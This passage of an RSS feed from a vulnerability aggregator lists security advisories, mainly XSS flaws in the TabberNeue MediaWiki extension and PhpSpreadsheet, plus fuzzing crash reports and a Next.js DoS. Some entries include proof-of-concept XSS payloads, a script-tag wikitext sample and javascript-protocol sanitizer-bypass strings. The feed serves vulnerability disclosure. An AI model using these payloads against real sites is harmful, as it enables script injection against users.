                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/StarCitizenTools/mediawiki-extensions-TabberNeue/security/advisories/GHSA-4x6x-8rm8-c37j'>https://github.com/StarCitizenTools/mediawiki-extensions-TabberNeue/security/advisories/GHSA-4x6x-8rm8-c37j</a></li><li>- <a target='_blank' href='https://github.com/StarCitizenTools/mediawiki-extensions-TabberNeue/commit/d8c3db4e5935476e496d979fb01f775d3d3282e6'>https://github.com/StarCitizenTools/mediawiki-extensions-TabberNeue/commit/d8c3db4e5935476e496d979fb01f775d3d3282e6</a></li><li>- <a target='_blank' href='https://github.com/StarCitizenTools/mediawiki-extensions-TabberNeue/commit/f229cab099c69006e25d4bad3579954e481dc566'>https://github.com/StarCitizenTools/mediawiki-extensions-TabberNeue/commit/f229cab099c69006e25d4bad3579954e481dc566</a></li><li>- <a target='_blank' href='https://github.com/StarCitizenTools/mediawiki-extensions-TabberNeue'>https://github.com/StarCitizenTools/mediawiki-extensions-TabberNeue</a></li></ul><br>
                            <b>Details:</b> <b>Extension:TabberNeue vulnerable to Cross-site Scripting</b><br>### Summary
There are several sources of arbitrary, unescaped user input being used to construct HTML, which allows any user that can edit pages or otherwise render wikitext to XSS other users.

&amp;gt; Edit: Only the first XSS can be reproduced in production.

### Details

&amp;gt; ✅ Verified and patched in f229cab099c69006e25d4bad3579954e481dc566

https:&#x2F;&#x2F;github.com&#x2F;StarCitizenTools&#x2F;mediawiki-extensions-TabberNeue&#x2F;blob&#x2F;2526daa9f8cfdd616c861c8439755cb74a6c8c6e&#x2F;includes&#x2F;TabberTransclude.php#L154
This doesn&#x27;t escape the user-supplied page name when outputting, so an XSS payload as the page name can be used here.

This was caused by d8c3db4e5935476e496d979fb01f775d3d3282e6.

----

&amp;gt; ❌ Invalid as MediaWiki parser sanitizes dangerous HTML

https:&#x2F;&#x2F;github.com&#x2F;StarCitizenTools&#x2F;mediawiki-extensions-TabberNeue&#x2F;blob&#x2F;2526daa9f8cfdd616c861c8439755cb74a6c8c6e&#x2F;includes&#x2F;Tabber.php#L160
The documentation for [`Parser::recursiveTagParse()`](https:&#x2F;&#x2F;doc.wikimedia.org&#x2F;mediawiki-core&#x2F;REL1_42&#x2F;php&#x2F;classMediaWiki_1_1Parser_1_1Parser.html#ae450036ec9abb417f142bfdaede02783) states that it returns unsafe HTML, and the `$content` being supplied is from user input.

This was caused by 95351812613e04717f3ad7844cfcc67e4ede4d11.

----

&amp;gt; ❌ Invalid as TabberParsoid is not being used

https:&#x2F;&#x2F;github.com&#x2F;StarCitizenTools&#x2F;mediawiki-extensions-TabberNeue&#x2F;blob&#x2F;2526daa9f8cfdd616c861c8439755cb74a6c8c6e&#x2F;includes&#x2F;TabberParsoid.php#L96
This uses unescaped user input as the attribute of an element, thus allowing the user to break out of the attribute or element and injecting arbitrary attributes to the element, or inserting new ones (such as a script tag).

This was caused by 8278e665480f08da635aee383c6b5caaeca26ba3.

### PoC
For the first XSS, render the following wikitext (whether it be through saving it to a page and viewing it, or via Special:ExpandTemplates):
```wikitext
&amp;lt;tabbertransclude&amp;gt;
&amp;lt;script&amp;gt;alert(1)&amp;lt;&#x2F;script&amp;gt; | hehe
&amp;lt;&#x2F;tabbertransclude&amp;gt;
```
![](https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;079365a9-203d-4758-a5a4-2166f9a32e62)

For the second XSS, I have given up attempting to reproduce it after over twenty minutes of &quot;surfing through the internals of the MediaWiki parser fishing for an XSS out of this giant contraption as I bring myself deeper and deeper into the cogs of the machine that no one knows how to maintain or fully operate ever since its conception&quot;.

For the third XSS, this is unreachable as the class is never used, though it should be fixed anyway (or the file removed).

### Impact
Any user with the ability to cause another user to render wikitext (such as viewing a page that the user can edit, or an attacker tricking the victim to click on a link to Special:ExpandTemplates with the malicious wikitext in the `wpInput` parameter) can XSS said user.

                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>OSV-2025-6: 0 | <b>Heap-buffer-overflow in next_marker</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#OSV-2025-6</link>
                    <pubDate>2025-01-06T00:16:10.036783Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/OSV-2025-6'>https://osv.dev/vulnerability/OSV-2025-6</a><br>
                            <b>Published:</b> 2025-01-06T00:16:10.036783Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=387317434'>https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=387317434</a></li></ul><br>
                            <b>Details:</b> <b>Heap-buffer-overflow in next_marker</b><br>OSS-Fuzz report: https:&#x2F;&#x2F;bugs.chromium.org&#x2F;p&#x2F;oss-fuzz&#x2F;issues&#x2F;detail?id=387317434

```
Crash type: Heap-buffer-overflow READ 1
Crash state:
next_marker
read_markers
consume_markers
```

                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>CVE-2024-13142: 4.8 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#CVE-2024-13142</link>
                    <pubDate>2025-01-05T23:15:06Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/CVE-2024-13142'>https://osv.dev/vulnerability/CVE-2024-13142</a><br>
                            <b>Published:</b> 2025-01-05T23:15:06Z<br>
                            <b>Severity:</b> 4.8<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/ZeroWdd/manager-system/issues/6'>https://github.com/ZeroWdd/manager-system/issues/6</a></li><li>- <a target='_blank' href='https://vuldb.com/?ctiid.290230'>https://vuldb.com/?ctiid.290230</a></li><li>- <a target='_blank' href='https://vuldb.com/?id.290230'>https://vuldb.com/?id.290230</a></li><li>- <a target='_blank' href='https://vuldb.com/?submit.469213'>https://vuldb.com/?submit.469213</a></li></ul><br>
                            <b>Details:</b> <b></b><br>A vulnerability was found in ZeroWdd studentmanager 1.0. It has been declared as problematic. This vulnerability affects the function submitAddRole of the file src&#x2F;main&#x2F;java&#x2F;com&#x2F;zero&#x2F;system&#x2F;controller&#x2F;RoleController. java. The manipulation of the argument name leads to cross site scripting. The attack can be initiated remotely.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>CVE-2024-13141: 5.4 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#CVE-2024-13141</link>
                    <pubDate>2025-01-05T15:15:17Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/CVE-2024-13141'>https://osv.dev/vulnerability/CVE-2024-13141</a><br>
                            <b>Published:</b> 2025-01-05T15:15:17Z<br>
                            <b>Severity:</b> 5.4<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://vuldb.com/?ctiid.290224'>https://vuldb.com/?ctiid.290224</a></li><li>- <a target='_blank' href='https://vuldb.com/?id.290224'>https://vuldb.com/?id.290224</a></li><li>- <a target='_blank' href='https://vuldb.com/?submit.468645'>https://vuldb.com/?submit.468645</a></li><li>- <a target='_blank' href='https://github.com/Hebing123/cve/issues/83'>https://github.com/Hebing123/cve/issues/83</a></li></ul><br>
                            <b>Details:</b> <b></b><br>A vulnerability classified as problematic was found in osuuu LightPicture up to 1.2.2. This vulnerability affects unknown code of the file &#x2F;api&#x2F;upload of the component SVG File Upload Handler. The manipulation of the argument file leads to cross site scripting. The attack can be initiated remotely. The exploit has been disclosed to the public and may be used.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>CVE-2024-13140: 5.4 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#CVE-2024-13140</link>
                    <pubDate>2025-01-05T12:15:05Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/CVE-2024-13140'>https://osv.dev/vulnerability/CVE-2024-13140</a><br>
                            <b>Published:</b> 2025-01-05T12:15:05Z<br>
                            <b>Severity:</b> 5.4<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://vuldb.com/?ctiid.290214'>https://vuldb.com/?ctiid.290214</a></li><li>- <a target='_blank' href='https://vuldb.com/?id.290214'>https://vuldb.com/?id.290214</a></li><li>- <a target='_blank' href='https://vuldb.com/?submit.468753'>https://vuldb.com/?submit.468753</a></li><li>- <a target='_blank' href='https://github.com/emlog/emlog/issues/312'>https://github.com/emlog/emlog/issues/312</a></li><li>- <a target='_blank' href='https://github.com/emlog/emlog/issues/312#issue-2758546837'>https://github.com/emlog/emlog/issues/312#issue-2758546837</a></li></ul><br>
                            <b>Details:</b> <b></b><br>A vulnerability classified as problematic has been found in Emlog Pro up to 2.4.3. Affected is an unknown function of the file &#x2F;admin&#x2F;article.php?action=upload_cover of the component Cover Upload Handler. The manipulation of the argument image leads to cross site scripting. It is possible to launch the attack remotely. The exploit has been disclosed to the public and may be used.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>OSV-2025-4: 0 | <b>Heap-buffer-overflow in ___interceptor_pthread_create</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#OSV-2025-4</link>
                    <pubDate>2025-01-05T00:17:02.263743Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/OSV-2025-4'>https://osv.dev/vulnerability/OSV-2025-4</a><br>
                            <b>Published:</b> 2025-01-05T00:17:02.263743Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=386713390'>https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=386713390</a></li></ul><br>
                            <b>Details:</b> <b>Heap-buffer-overflow in ___interceptor_pthread_create</b><br>OSS-Fuzz report: https:&#x2F;&#x2F;bugs.chromium.org&#x2F;p&#x2F;oss-fuzz&#x2F;issues&#x2F;detail?id=386713390

```
Crash type: Heap-buffer-overflow READ 8
Crash state:
___interceptor_pthread_create
```

                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>OSV-2025-3: 0 | <b>Heap-buffer-overflow in avifImageAddUUIDProperty</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#OSV-2025-3</link>
                    <pubDate>2025-01-05T00:10:22.871565Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/OSV-2025-3'>https://osv.dev/vulnerability/OSV-2025-3</a><br>
                            <b>Published:</b> 2025-01-05T00:10:22.871565Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=386713389'>https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=386713389</a></li></ul><br>
                            <b>Details:</b> <b>Heap-buffer-overflow in avifImageAddUUIDProperty</b><br>OSS-Fuzz report: https:&#x2F;&#x2F;bugs.chromium.org&#x2F;p&#x2F;oss-fuzz&#x2F;issues&#x2F;detail?id=386713389

```
Crash type: Heap-buffer-overflow READ 16
Crash state:
avifImageAddUUIDProperty
avif::testutil::PropsValid
```

                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>OSV-2025-1: 0 | <b>Segv on unknown address in avif_fuzztest_properties@PropertiesAvifFuzzTest.PropsValid</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#OSV-2025-1</link>
                    <pubDate>2025-01-04T00:00:30.888504Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/OSV-2025-1'>https://osv.dev/vulnerability/OSV-2025-1</a><br>
                            <b>Published:</b> 2025-01-04T00:00:30.888504Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=386572864'>https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=386572864</a></li></ul><br>
                            <b>Details:</b> <b>Segv on unknown address in avif_fuzztest_properties@PropertiesAvifFuzzTest.PropsValid</b><br>OSS-Fuzz report: https:&#x2F;&#x2F;bugs.chromium.org&#x2F;p&#x2F;oss-fuzz&#x2F;issues&#x2F;detail?id=386572864

```
Crash type: Segv on unknown address
Crash state:
avif_fuzztest_properties@PropertiesAvifFuzzTest.PropsValid
```

                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-7m27-7ghc-44w9: 5.3 | <b>Next.js Allows a Denial of Service (DoS) with Server Actions</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-7m27-7ghc-44w9</link>
                    <pubDate>2025-01-03T20:19:29Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-7m27-7ghc-44w9'>https://osv.dev/vulnerability/GHSA-7m27-7ghc-44w9</a><br>
                            <b>Published:</b> 2025-01-03T20:19:29Z<br>
                            <b>Severity:</b> 5.3<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/vercel/next.js/security/advisories/GHSA-7m27-7ghc-44w9'>https://github.com/vercel/next.js/security/advisories/GHSA-7m27-7ghc-44w9</a></li><li>- <a target='_blank' href='https://github.com/vercel/next.js'>https://github.com/vercel/next.js</a></li></ul><br>
                            <b>Details:</b> <b>Next.js Allows a Denial of Service (DoS) with Server Actions</b><br>### Impact
A Denial of Service (DoS) attack allows attackers to construct requests that leaves requests to Server Actions hanging until the hosting provider cancels the function execution.

_Note: Next.js server is idle during that time and only keeps the connection open. CPU and memory footprint are low during that time._

Deployments without any protection against long running Server Action invocations are especially vulnerable. Hosting providers like Vercel or Netlify set a default maximum duration on function execution to reduce the risk of excessive billing.

This is the same issue as if the incoming HTTP request has an invalid `Content-Length` header or never closes. If the host has no other mitigations to those then this vulnerability is novel.

This vulnerability affects only Next.js deployments using Server Actions.

### Patches

This vulnerability was resolved in Next.js 14.2.21, 15.1.2, and 13.5.8. We recommend that users upgrade to a safe version.

### Workarounds

There are no official workarounds for this vulnerability.

### Credits

Thanks to the PackDraw team for responsibly disclosing this vulnerability.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-q9jv-mm3r-j47r: 5.4 | <b>PhpSpreadsheet allows bypass XSS sanitizer using the javascript protocol and special characters</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-q9jv-mm3r-j47r</link>
                    <pubDate>2025-01-03T17:29:10Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-q9jv-mm3r-j47r'>https://osv.dev/vulnerability/GHSA-q9jv-mm3r-j47r</a><br>
                            <b>Published:</b> 2025-01-03T17:29:10Z<br>
                            <b>Severity:</b> 5.4<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-q9jv-mm3r-j47r'>https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-q9jv-mm3r-j47r</a></li><li>- <a target='_blank' href='https://github.com/PHPOffice/PhpSpreadsheet/commit/45052f88e04c735d56457a8ffcdc40b2635a028e'>https://github.com/PHPOffice/PhpSpreadsheet/commit/45052f88e04c735d56457a8ffcdc40b2635a028e</a></li><li>- <a target='_blank' href='https://github.com/PHPOffice/PhpSpreadsheet'>https://github.com/PHPOffice/PhpSpreadsheet</a></li></ul><br>
                            <b>Details:</b> <b>PhpSpreadsheet allows bypass XSS sanitizer using the javascript protocol and special characters</b><br># Bypass XSS sanitizer using the javascript protocol and special characters

**Product**: Phpspreadsheet
**Version**: version 3.6.0
**CWE-ID**: CWE-79: Improper Neutralization of Input During Web Page Generation (&#x27;Cross-site Scripting&#x27;)
**CVSS vector v.3.1**: 5.4 (AV:N&#x2F;AC:L&#x2F;PR:L&#x2F;UI:R&#x2F;S:C&#x2F;C:L&#x2F;I:L&#x2F;A:N)
**CVSS vector v.4.0**: 4.8 (AV:N&#x2F;AC:L&#x2F;AT:N&#x2F;PR:L&#x2F;UI:A&#x2F;VC:L&#x2F;VI:L&#x2F;VA:N&#x2F;SC:L&#x2F;SI:L&#x2F;SA:N)
**Description**: an attacker can use special characters, so that the library processes the javascript protocol with special characters and generates an HTML link
**Impact**: executing arbitrary JavaScript code in the browser
**Vulnerable component**: class `PhpOffice\PhpSpreadsheet\Writer\Html`, method `generateRow`
**Exploitation conditions**: a user viewing a specially generated Excel file
**Mitigation**: additional sanitization of special characters in a string
**Researcher**: Aleksey Solovev (Positive Technologies)

# Research

The researcher discovered zero-day vulnerability Bypass XSS sanitizer using the javascript protocol and special characters in Phpspreadsheet.

The following code is written on the server, which translates the XLSX file into a HTML representation and displays it in the response.

*Listing 6. Source code on the server*

```
&amp;lt;?php

require __DIR__ . &#x27;&#x2F;vendor&#x2F;autoload.php&#x27;;

$inputFileName = &#x27;.&#x2F;doc&#x2F;Book1.xlsx&#x27;;
$spreadsheet = \PhpOffice\PhpSpreadsheet\IOFactory::load($inputFileName);
$writer = new \PhpOffice\PhpSpreadsheet\Writer\Html($spreadsheet);
print($writer-&amp;gt;generateHTMLAll());
```

An attacker can use special characters so that this library processes the javascript protocol with special characters and generates a HTML link.
The Excel file is unpacked and a hyperlink in the file is inserted into the `xl&#x2F;worksheets&#x2F;sheet1.xml` file.

![fig11](https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;b9d53f7a-6f36-4853-95f9-8aa22f81eccd)

*Figure 11. Using the javascript protocol with special characters*

Some payloads help bypass the security system and carry out a XSS attack.

*Listing 7. HTML form that demonstrates the exploitation of the XSS vulnerability*

```
jav&amp;#x09;ascript:alert()
jav&amp;#x0D;ascript:alert()
jav&amp;#x0A;ascript:alert()
```

It&#x27;s clear that the javascript protocol with special characters is used. 

![fig12](https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;7595e88b-9848-4251-845c-2c2d8032e479)

*Figure 12. Using the javascript protocol with special characters*

Due to the special characters, the execution stream ends up on line 1543, and the link is built in HTML form with the javascript protocol.

&amp;lt;img width=&quot;373&quot; alt=&quot;fig13&quot; src=&quot;https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;3ca0c3c6-daa9-4502-ad9e-b803f308fd26&quot; &#x2F;&amp;gt;

*Figure 13. Executing arbitrary JavaScript code*

# Credit
This vulnerability was discovered by **Aleksey Solovev (Positive Technologies)**
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-hwcp-2h35-p66w: 4.8 | <b>PhpSpreadsheet has a Cross-Site Scripting (XSS) vulnerability of the hyperlink base in the HTML page header</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-hwcp-2h35-p66w</link>
                    <pubDate>2025-01-03T17:28:50Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-hwcp-2h35-p66w'>https://osv.dev/vulnerability/GHSA-hwcp-2h35-p66w</a><br>
                            <b>Published:</b> 2025-01-03T17:28:50Z<br>
                            <b>Severity:</b> 4.8<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-hwcp-2h35-p66w'>https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-hwcp-2h35-p66w</a></li><li>- <a target='_blank' href='https://github.com/PHPOffice/PhpSpreadsheet/commit/45052f88e04c735d56457a8ffcdc40b2635a028e'>https://github.com/PHPOffice/PhpSpreadsheet/commit/45052f88e04c735d56457a8ffcdc40b2635a028e</a></li><li>- <a target='_blank' href='https://github.com/PHPOffice/PhpSpreadsheet'>https://github.com/PHPOffice/PhpSpreadsheet</a></li></ul><br>
                            <b>Details:</b> <b>PhpSpreadsheet has a Cross-Site Scripting (XSS) vulnerability of the hyperlink base in the HTML page header</b><br># Cross-Site Scripting (XSS) vulnerability of the hyperlink base in the HTML page header

**Product**: Phpspreadsheet
**Version**: version 3.6.0
**CWE-ID**: CWE-79: Improper Neutralization of Input During Web Page Generation (&#x27;Cross-site Scripting&#x27;)
**CVSS vector v.3.1**: 5.4 (AV:N&#x2F;AC:L&#x2F;PR:L&#x2F;UI:R&#x2F;S:C&#x2F;C:L&#x2F;I:L&#x2F;A:N)
**CVSS vector v.4.0**: 4.8 (AV:N&#x2F;AC:L&#x2F;AT:N&#x2F;PR:L&#x2F;UI:A&#x2F;VC:L&#x2F;VI:L&#x2F;VA:N&#x2F;SC:L&#x2F;SI:L&#x2F;SA:N)
**Description**: the HTML page is formed without sanitizing the hyperlink base
**Impact**: executing arbitrary JavaScript code in the browser
**Vulnerable component**: class `PhpOffice\PhpSpreadsheet\Writer\Html`, method `generateHTMLHeader`
**Exploitation conditions**: a user viewing a specially generated Excel file
**Mitigation**: additional sanitization of special characters in a string
**Researcher**: Aleksey Solovev (Positive Technologies)

# Research

The researcher discovered zero-day vulnerability Cross-Site Scripting (XSS) vulnerability of the hyperlink base in the HTML page header in Phpspreadsheet.
The following code is written on the server, which translates the XLSX file into a HTML representation and displays it in the response.

*Listing 8. Source code on the server*

```
&amp;lt;?php

require __DIR__ . &#x27;&#x2F;vendor&#x2F;autoload.php&#x27;;

$inputFileName = &#x27;.&#x2F;doc&#x2F;Book1.xlsx&#x27;;
$spreadsheet = \PhpOffice\PhpSpreadsheet\IOFactory::load($inputFileName);
$writer = new \PhpOffice\PhpSpreadsheet\Writer\Html($spreadsheet);
print($writer-&amp;gt;generateHTMLAll());
```

An attacker can embed a payload in a file property that will result in the execution of arbitrary JavaScript code.
The Excel file is unpacked and a HyperlinkBase in the file is inserted into the `docProps&#x2F;app.xml` file.

![fig14](https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;f68ef7fc-e78e-4424-8753-4318b6ff51c3)

*Figure 14. Embedding the payload* 

After the changes were made, a new archive with the xlsx extension was created. At the moment of converting the xlsx file into the HTML representation, a property is obtained that participates in the formation of a string without sanitization.

![fig15](https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;0aa7398c-ddd9-4c5a-ab04-41af0236dcba)

*Figure 15. Generating the HTML page header using the HyperlinkBase property* 

After generating and displaying the HTML representation of the XLSX file, arbitrary JavaScript code will be executed.
&amp;lt;img width=&quot;356&quot; alt=&quot;fig16&quot; src=&quot;https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;c3694661-31e3-4be8-9a86-6eb4dd4647b5&quot; &#x2F;&amp;gt;

*Figure 16. Executing arbitrary JavaScript code* 

# Credit
This vulnerability was discovered by **Aleksey Solovev (Positive Technologies)**
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-wv23-996v-q229: 5.4 | <b>PhpSpreadsheet has a Cross-Site Scripting (XSS) vulnerability in custom properties</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-wv23-996v-q229</link>
                    <pubDate>2025-01-03T17:25:45Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-wv23-996v-q229'>https://osv.dev/vulnerability/GHSA-wv23-996v-q229</a><br>
                            <b>Published:</b> 2025-01-03T17:25:45Z<br>
                            <b>Severity:</b> 5.4<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-wv23-996v-q229'>https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-wv23-996v-q229</a></li><li>- <a target='_blank' href='https://github.com/PHPOffice/PhpSpreadsheet/commit/45052f88e04c735d56457a8ffcdc40b2635a028e'>https://github.com/PHPOffice/PhpSpreadsheet/commit/45052f88e04c735d56457a8ffcdc40b2635a028e</a></li><li>- <a target='_blank' href='https://github.com/PHPOffice/PhpSpreadsheet'>https://github.com/PHPOffice/PhpSpreadsheet</a></li></ul><br>
                            <b>Details:</b> <b>PhpSpreadsheet has a Cross-Site Scripting (XSS) vulnerability in custom properties</b><br># Cross-Site Scripting (XSS) vulnerability in custom properties

**Product**: Phpspreadsheet
**Version**: version 3.6.0
**CWE-ID**: CWE-79: Improper Neutralization of Input During Web Page Generation (&#x27;Cross-site Scripting&#x27;)
**CVSS vector v.3.1**: 5.4 (AV:N&#x2F;AC:L&#x2F;PR:L&#x2F;UI:R&#x2F;S:C&#x2F;C:L&#x2F;I:L&#x2F;A:N)
**CVSS vector v.4.0**: 4.8 (AV:N&#x2F;AC:L&#x2F;AT:N&#x2F;PR:L&#x2F;UI:A&#x2F;VC:L&#x2F;VI:L&#x2F;VA:N&#x2F;SC:L&#x2F;SI:L&#x2F;SA:N)
**Description**: the HTML page is generated without clearing custom properties
**Impact**: executing arbitrary JavaScript code in the browser
**Vulnerable component**: class `PhpOffice\PhpSpreadsheet\Writer\Html`, method `generateMeta`
**Exploitation conditions**: a user viewing a specially generated Excel file
**Mitigation**: additional sanitization of special characters in a string
**Researcher**: Aleksey Solovev (Positive Technologies)

# Research

The researcher discovered zero-day vulnerability Cross-Site Scripting (XSS) vulnerability in custom properties in Phpspreadsheet.
The following code is written on the server, which translates the XLSX file into a HTML representation and displays it in the response.

*Listing 9. Source code on the server*

```
&amp;lt;?php

require __DIR__ . &#x27;&#x2F;vendor&#x2F;autoload.php&#x27;;

$inputFileName = &#x27;.&#x2F;doc&#x2F;Book1.xlsx&#x27;;
$spreadsheet = \PhpOffice\PhpSpreadsheet\IOFactory::load($inputFileName);
$writer = new \PhpOffice\PhpSpreadsheet\Writer\Html($spreadsheet);
print($writer-&amp;gt;generateHTMLAll());
```

An attacker can embed a payload in a file property that will result in the execution of arbitrary JavaScript code.
The Excel file is unpacked and a custom property in the file is inserted into the `docProps&#x2F;custom.xml` file.

![fig17](https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;65453b48-bca5-4f5c-a683-315a7bb1ab1f)

*Figure 17. Embedding the payload*

After making the changes, a new archive with the xlsx extension was created. At the moment of converting the xlsx file into an HTML representation, a property is obtained that participates in the formation of a string without sanitization.

![fig18](https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;e0f63bfb-d9e1-4c9d-a2a9-8a0a20406cdc)

*Figure 18. Getting a custom property*

When calling the static `generateMeta` method, you can see that the key of the custom property is displayed without sanitization.

![fig19](https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;8c74e264-af68-4f62-8ac7-437e65884e86)

*Figure 19. Getting a custom property*

As a result, when viewing the excel file as the HTML representation, arbitrary JavaScript code will be executed.

&amp;lt;img width=&quot;356&quot; alt=&quot;fig20&quot; src=&quot;https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;a6ed21e3-685c-415c-b2dc-453bc0652bef&quot; &#x2F;&amp;gt;

*Figure 20. Executing arbitrary JavaScript code*

# Credit
This vulnerability was discovered by **Aleksey Solovev (Positive Technologies)**
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-j2xg-cjcx-4677: 7.1 | <b>PhpSpreadsheet allows unauthorized Reflected XSS in Currency.php file</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-j2xg-cjcx-4677</link>
                    <pubDate>2025-01-03T17:06:51Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-j2xg-cjcx-4677'>https://osv.dev/vulnerability/GHSA-j2xg-cjcx-4677</a><br>
                            <b>Published:</b> 2025-01-03T17:06:51Z<br>
                            <b>Severity:</b> 7.1<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-j2xg-cjcx-4677'>https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-j2xg-cjcx-4677</a></li><li>- <a target='_blank' href='https://github.com/PHPOffice/PhpSpreadsheet/commit/700a80346be269af668914172bc6f4521982d0b4'>https://github.com/PHPOffice/PhpSpreadsheet/commit/700a80346be269af668914172bc6f4521982d0b4</a></li><li>- <a target='_blank' href='https://github.com/PHPOffice/PhpSpreadsheet'>https://github.com/PHPOffice/PhpSpreadsheet</a></li></ul><br>
                            <b>Details:</b> <b>PhpSpreadsheet allows unauthorized Reflected XSS in Currency.php file</b><br># Unauthorized Reflected XSS in `Currency.php` file

**Product**: Phpspreadsheet
**Version**: version 3.6.0
**CWE-ID**: CWE-79: Improper Neutralization of Input During Web Page Generation (&#x27;Cross-site Scripting&#x27;)
**CVSS vector v.3.1**: 8.2 (AV:N&#x2F;AC:L&#x2F;PR:N&#x2F;UI:R&#x2F;S:U&#x2F;C:L&#x2F;I:H&#x2F;A:N)
**CVSS vector v.4.0**: 8.3 (AV:N&#x2F;AC:L&#x2F;AT:N&#x2F;PR:N&#x2F;UI:A&#x2F;VC:N&#x2F;VI:H&#x2F;VA:N&#x2F;SC:L&#x2F;SI:H&#x2F;SA:L)
**Description**: using the `&#x2F;vendor&#x2F;phpoffice&#x2F;phpspreadsheet&#x2F;samples&#x2F;Wizards&#x2F;NumberFormat&#x2F;Currency.php` script, an attacker can perform XSS-type attack
**Impact**: executing arbitrary JavaScript code in the browser
**Vulnerable component**: the `&#x2F;vendor&#x2F;phpoffice&#x2F;phpspreadsheet&#x2F;samples&#x2F;Wizards&#x2F;NumberFormat&#x2F;Currency.php` file
**Exploitation conditions**: an unauthorized user
**Mitigation**: sanitization of the `currency` variable
**Researcher**: Aleksey Solovev (Positive Technologies)

# Research

